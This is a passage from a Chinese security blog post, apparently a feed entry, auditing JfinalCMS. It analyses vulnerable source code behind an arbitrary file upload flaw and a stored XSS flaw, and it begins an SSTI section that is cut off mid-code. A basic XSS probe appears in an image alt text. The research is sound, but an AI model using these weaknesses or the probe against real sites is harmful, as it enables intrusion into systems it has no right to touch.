    <link href="https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/"/>
    <id>https://summersec.github.io/2020/12/20/%E4%B8%80%E6%AC%A1%E6%84%8F%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1----JfinalCMS%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-12-20T13:27:45.000Z</published>
    <updated>2020-12-21T07:12:31.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CVE。<br>&emsp;&emsp; 认真严肃的挑选了一波之后，我选择了这个CMS，可能是缘分，也可能是好玩吧。主要看的是这个项目有QQ群，可以加群讨论一下问题，方便更好的研究。先加群不说别的。<a href="https://gitee.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">gitee地址</a>，<a href="https://github.com/jflyfox/jfinal_cms" target="_blank" rel="noopener">GitHub地址</a>。<br><img src="https://img-blog.csdnimg.cn/20200407202518575.png" alt="在这里插入图片描述"></p><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp;环境的搭建很简单，几种方式可以选择。第一种直接git项目的源码，idea打开项目，然后idea会自动导入下载maven。<br><img src="https://img-blog.csdnimg.cn/20200412200121848.png" alt="在这里插入图片描述"><br>第二种方式是去GitHub或者Gitee上下载发行版。<br><a href="https://gitee.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">gitee下载地址</a><br><a href="https://github.com/jflyfox/jfinal_cms/releases" target="_blank" rel="noopener">github下载地址</a></p><hr><h1 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h1><p>&emsp;&emsp; <a href="https://samny.blog.csdn.net//details/105385042" target="_blank" rel="noopener">Arbitrary file upload vulnerability</a>文件上传漏洞存在于管理员后台中的模板管理。</p><p><img src="https://img-blog.csdnimg.cn/20200411154350644.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200406165725733.png" alt><br><img src="https://img-blog.csdnimg.cn/20200406165740279.png" alt="&lt;script&gt;alert(1)&lt;/script&gt;"></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 断点调试，断点设置在<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>模板页面的操作的都是由FileManangerController.java控制。</p><ol><li><code>HttpServletRequest request = getRequest();</code>有点Java知识的人都认识这个,所以第一个断点设置在这里。<br><img src="https://img-blog.csdnimg.cn/2020041116011776.png" alt="在这里插入图片描述"></li><li>第二个断点，审计的上传漏洞，肯定设置在上传方法里。<br><img src="https://img-blog.csdnimg.cn/20200411160132564.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h3><p><code>判断是否为空的操作</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Iterator&lt;?&gt; it = <span class="keyword">this</span>.files.iterator();</span><br><span class="line">        <span class="keyword">if</span> (!it.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 项目主说这里修改一下就好了，但默认是这样子的，可见开发者自以为是可以防止任意上传文件漏洞，但其实这里默认是这样子设置。<br><img src="https://img-blog.csdnimg.cn/20200412135823674.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 默认设置是一次最多上传5个文件，文件大小不超过16MB。<br><img src="https://img-blog.csdnimg.cn/20200412142146187.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> maxSize = NumberUtils.parseLong(MAX_SIZE);</span><br><span class="line"><span class="keyword">if</span> (getConfig(<span class="string">"upload-size"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">    maxSize = Integer.parseInt(getConfig(<span class="string">"upload-size"</span>));</span><br><span class="line">    <span class="keyword">if</span> (maxSize != <span class="number">0</span> &amp;&amp; item.getSize() &gt; (maxSize * <span class="number">1024</span> * <span class="number">1024</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.error(sprintf(lang(<span class="string">"UPLOAD_FILES_SMALLER_THAN"</span>), maxSize + <span class="string">"Mb"</span>));</span><br><span class="line">        error = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 这里maxSize是默认为0。<br><img src="https://img-blog.csdnimg.cn/2020041214043196.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020041214394072.png" alt="在这里插入图片描述"><br>&emsp;&emsp;  下面的一段代码是判断是否只能上传图片，在配置文件<code>E:\Soures\jfinal_cms\src\main\resources\conf\filemanager.properties</code>下可以看到文件复写和上传文件大小设置是为0的（<code>0代表的是没有限制</code>），默认是可以上传其他文件（<code>upload-imagesonly=false</code>）。<br><img src="https://img-blog.csdnimg.cn/20200412144828539.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!isImage(item.getName())</span><br><span class="line">        &amp;&amp; (getConfig(<span class="string">"upload-imagesonly"</span>) != <span class="keyword">null</span> &amp;&amp; getConfig(<span class="string">"upload-imagesonly"</span>).equals(<span class="string">"true"</span>) || <span class="keyword">this</span>.params</span><br><span class="line">        .get(<span class="string">"type"</span>) != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.params.get(<span class="string">"type"</span>).equals(<span class="string">"Image"</span>))) &#123;</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"UPLOAD_IMAGES_ONLY"</span>));</span><br><span class="line">    error = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建临时文件，后面会用到。作用是先将上传的文件以临时文件的存放着，然后把复制到上传目录下，重新命名删除临时文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            tmpFile = <span class="keyword">new</span> File(<span class="keyword">this</span>.fileRoot + TMP_PATH + <span class="string">"filemanager_"</span> + System.currentTimeMillis() + <span class="string">".tmp"</span>);</span><br><span class="line">            File filePath = tmpFile.getParentFile();</span><br><span class="line">            <span class="keyword">if</span> (!filePath.exists()) &#123;</span><br><span class="line">                filePath.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            item.write(tmpFile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">    <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 文件上传后的操作，也就是上面说到的复制重命名，最后将临时文件删除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// file rename</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; tmpFile != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String allowed[] = &#123;<span class="string">"."</span>, <span class="string">"-"</span>&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">"add"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String currentPath = <span class="string">""</span>;</span><br><span class="line">                String fileName = params.get(<span class="string">"_fileName"</span>);</span><br><span class="line">                String filePath = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    currentPath = params.get(<span class="string">"currentpath"</span>);</span><br><span class="line">                    respPath = currentPath;</span><br><span class="line">                    currentPath = <span class="keyword">new</span> String(currentPath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    currentPath = getFilePath(currentPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                filePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + currentPath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(filePath, fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(filePath + fileName);</span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"replace"</span>.equals(params.get(<span class="string">"mode"</span>))) &#123;</span><br><span class="line">                fileInfo = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                String respPath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                String fileName = <span class="string">""</span>;</span><br><span class="line">                String newFilePath = <span class="string">""</span>;</span><br><span class="line">                String saveFilePath = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    newFilePath = params.get(<span class="string">"newfilepath"</span>);</span><br><span class="line">                    newFilePath = <span class="keyword">new</span> String(newFilePath.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>); <span class="comment">// 中文转码</span></span><br><span class="line">                    respPath = newFilePath.substring(<span class="number">0</span>, newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    fileName = newFilePath.substring(newFilePath.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>);</span><br><span class="line">                    newFilePath = getFilePath(newFilePath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                saveFilePath = FileManagerUtils.rebulid(<span class="keyword">this</span>.fileRoot + newFilePath);</span><br><span class="line">                File saveFile = <span class="keyword">new</span> File(saveFilePath);</span><br><span class="line"></span><br><span class="line">                LinkedHashMap&lt;String, String&gt; strList = <span class="keyword">new</span> LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">                strList.put(<span class="string">"fileName"</span>, fileName);</span><br><span class="line">                fileName = (String) cleanString(strList, allowed).get(<span class="string">"fileName"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (getConfig(<span class="string">"upload-overwrite"</span>).equals(<span class="string">"false"</span>)) &#123;</span><br><span class="line">                    fileName = <span class="keyword">this</span>.checkFilename(saveFile.getParent(), fileName, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (saveFile.exists()) &#123;</span><br><span class="line">                    <span class="comment">// before bakup</span></span><br><span class="line">                    bakupFile(saveFile);</span><br><span class="line">                    <span class="comment">// delete src file</span></span><br><span class="line">                    saveFile.delete();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                tmpFile.renameTo(saveFile);</span><br><span class="line"></span><br><span class="line">                fileInfo.put(<span class="string">"Path"</span>, respPath);</span><br><span class="line">                fileInfo.put(<span class="string">"Name"</span>, fileName);</span><br><span class="line">                fileInfo.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">                fileInfo.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(<span class="string">"INVALID_FILE_UPLOAD"</span>, e);</span><br><span class="line">        <span class="keyword">this</span>.error(lang(<span class="string">"INVALID_FILE_UPLOAD"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 临时文件处理</span></span><br><span class="line">    <span class="keyword">if</span> (tmpFile.exists()) &#123;</span><br><span class="line">        tmpFile.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fileInfo;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>开发者需要通过限制上传文件大小来限制一些文件的上传，但默认配置是没有限制，很可能是开发者为了自己开发方便，但最后忘记修改设置。</li><li>上传文件，判断是否是上传图片之后，没有在做其他判断限制，然后导致任意文件上传漏洞。</li><li>配置文件中默认是不开启<code>filemanager.upload-imagesonly</code>需要使用者手动设置。</li><li>开发者仅仅在前端做了文件上传的白名单，后端没有没有进行校验，导致黑客可以绕过前端验证，上传任意恶意文件。（前端验证本文没有体现，但真的做了限制，有详情的童鞋可以去看看。）</li></ol><hr><h1 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h1><p><img src="https://img-blog.csdnimg.cn/20200407185120625.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185154471.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200407185238421.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>&emsp;&emsp; 漏洞源码存在于<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\front\controller\PersonController.java</code><br>&emsp;&emsp; 第一部分功能有以下几个：</p><ol><li>将提交数据Json化</li><li>根据用户Session判断用户id（数据库内的id）</li><li>判断旧密码和新设置的密码是否正确</li><li>判断Email的格式是否正确<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">JSONObject json = <span class="keyword">new</span> JSONObject();</span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">2</span>);<span class="comment">// 失败</span></span><br><span class="line"></span><br><span class="line">SysUser user = (SysUser) getSessionUser();</span><br><span class="line"><span class="keyword">int</span> userid = user.getInt(<span class="string">"userid"</span>);</span><br><span class="line">SysUser model = getModel(SysUser<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (userid != model.getInt(<span class="string">"userid"</span>)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"提交数据错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三方用户不需要密码</span></span><br><span class="line"><span class="keyword">if</span> (user.getInt(<span class="string">"usertype"</span>) != <span class="number">4</span>) &#123;</span><br><span class="line">String oldPassword = getPara(<span class="string">"old_password"</span>);</span><br><span class="line">String newPassword = getPara(<span class="string">"new_password"</span>);</span><br><span class="line">String newPassword2 = getPara(<span class="string">"new_password2"</span>);</span><br><span class="line"><span class="keyword">if</span> (!user.getStr(<span class="string">"password"</span>).equals(JFlyFoxUtils.passwordEncrypt(oldPassword))) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"密码错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword) &amp;&amp; !newPassword.equals(newPassword2)) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"两次新密码不一致！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (StrUtils.isNotEmpty(newPassword)) &#123; <span class="comment">// 输入密码并且一直</span></span><br><span class="line">model.set(<span class="string">"password"</span>, JFlyFoxUtils.passwordEncrypt(newPassword));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrUtils.isNotEmpty(model.getStr(<span class="string">"email"</span>)) &amp;&amp; model.getStr(<span class="string">"email"</span>).indexOf(<span class="string">"@"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">json.put(<span class="string">"msg"</span>, <span class="string">"email格式错误！"</span>);</span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>&emsp;&emsp; <code>model.update();</code>方法是更新数据，将信息写入数据库。具体实习方法可以下一部分代码。<br><img src="https://img-blog.csdnimg.cn/20200412175111793.png" alt="在这里插入图片描述"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">model.update();</span><br><span class="line">UserCache.init(); <span class="comment">// 设置缓存</span></span><br><span class="line">SysUser newUser = SysUser.dao.findById(userid);</span><br><span class="line">setSessionUser(newUser); <span class="comment">// 设置session</span></span><br><span class="line">json.put(<span class="string">"status"</span>, <span class="number">1</span>);<span class="comment">// 成功</span></span><br><span class="line"></span><br><span class="line">renderJson(json.toJSONString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>&emsp;&emsp; 首先方法会进行一个判断，然后创建一个sql语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">filter(FILTER_BY_UPDATE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_getModifyFlag().isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table table = _getTable();</span><br><span class="line">String[] pKeys = table.getPrimaryKey();</span><br><span class="line"><span class="keyword">for</span> (String pKey : pKeys) &#123;</span><br><span class="line">Object id = attrs.get(pKey);</span><br><span class="line"><span class="keyword">if</span> (id == <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(<span class="string">"You can't update model without Primary Key, "</span> + pKey + <span class="string">" can not be null."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Config config = _getConfig();</span><br><span class="line">StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">List&lt;Object&gt; paras = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">config.dialect.forModelUpdate(table, attrs, _getModifyFlag(), sql, paras);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (paras.size() &lt;= <span class="number">1</span>) &#123;<span class="comment">// Needn't update</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 创建数据库连接，更新数据。    可以看到执行完这步就会更新数据库内容。（<code>利用MySQL语句监控，可以看到最下面的一条是执行的sql语句</code>）<br><img src="https://img-blog.csdnimg.cn/20200412175227291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200412175330982.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --------</span></span><br><span class="line">Connection conn = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">conn = config.getConnection();</span><br><span class="line"><span class="keyword">int</span> result = Db.update(config, conn, sql.toString(), paras.toArray());</span><br><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">_getModifyFlag().clear();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ActiveRecordException(e);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">config.close(conn);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol><li>我们可以看到整个数据更新的过程，我们没有看到任何的防护措施，过滤字符手段。</li></ol><hr><h1 id="SSTI模板注入漏洞"><a href="#SSTI模板注入漏洞" class="headerlink" title="SSTI模板注入漏洞"></a>SSTI模板注入漏洞</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; 感谢长亭科技大佬@Lilc耐心指导，这个漏洞也是这位大佬挖的，我只是漏洞复现并给大家分享一下笔者构造SSTI模板注入漏洞payload经验。</p><hr><p><img src="https://img-blog.csdnimg.cn/20200413194319697.gif" alt="在这里插入图片描述"><br>&emsp;&emsp; 漏洞存在的位置在管理员后台模板修改下，可以修改模板代码，插入恶意代码等操作。插入一段恶意代码可导致远程代码执行。</p><hr><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><img src="https://img-blog.csdnimg.cn/20200414163051378.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414163122383.png" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 点击保存页面的首先会进入到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManagerController.java</code>然后判断请求方法，是POST方法会判断是upload还是saveFile，如果是saveFile方法会跳转到<code>E:\Soures\jfinal_cms\src\main\java\com\jflyfox\modules\filemanager\FileManager.java</code>中的saveFile方法。<br><img src="https://img-blog.csdnimg.cn/20200414163459783.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSONObject <span class="title">saveFile</span><span class="params">()</span> 